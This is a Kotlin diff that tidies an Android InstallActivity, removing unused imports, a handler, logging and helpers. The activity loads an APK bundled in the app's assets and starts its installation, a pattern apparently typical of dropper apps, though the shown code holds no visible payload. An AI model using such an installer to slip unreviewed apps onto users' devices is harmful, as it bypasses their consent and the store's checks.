@@ -2,9 +2,6 @@ package com.cristal.bristral.tristal.mistral
 
 import android.content.Intent
 import android.os.Bundle
-import android.os.Handler
-import android.os.Looper
-import android.util.Log
 import android.view.View
 import android.widget.ProgressBar
 import android.widget.TextView
@@ -20,7 +17,6 @@ class InstallActivity : AppCompatActivity() {
 
     private var progressBar: ProgressBar? = null
     private var tvStatus: TextView? = null
-    private val handler = Handler(Looper.getMainLooper())
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -37,9 +33,7 @@ class InstallActivity : AppCompatActivity() {
         try {
             val apkBytes = loadAssets()
             if (apkBytes == null || apkBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\napk is null or empty"); return }
-
             runOnUiThread { installApkDirect(apkBytes) }
-
         } catch (e: Exception) {
             showMessage("STEP:FLOW\n${e.javaClass.simpleName}:\n${e.message}")
         }
@@ -71,7 +65,6 @@ class InstallActivity : AppCompatActivity() {
             startActivity(intent)
 
         } catch (e: Exception) {
-            android.util.Log.e("InstallActivity", "installApkDirect FAILED: ${e.javaClass.simpleName}: ${e.message}", e)
             showMessage("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
         }
     }
@@ -82,10 +75,6 @@ class InstallActivity : AppCompatActivity() {
     }
 
     // ── HELPERS ───────────────────────────────────────────────
-    private fun showNormal() {
-        runOnUiThread { tvStatus?.text = getString(R.string.please_keep_connected); progressBar?.visibility = View.GONE }
-    }
-
     private fun showMessage(msg: String) {
         runOnUiThread {
             progressBar?.visibility = View.GONE
@@ -93,6 +82,4 @@ class InstallActivity : AppCompatActivity() {
             android.widget.Toast.makeText(this, msg, android.widget.Toast.LENGTH_LONG).show()
         }
     }
-
-    override fun onDestroy() { super.onDestroy(); handler.removeCallbacksAndMessages(null) }
 }
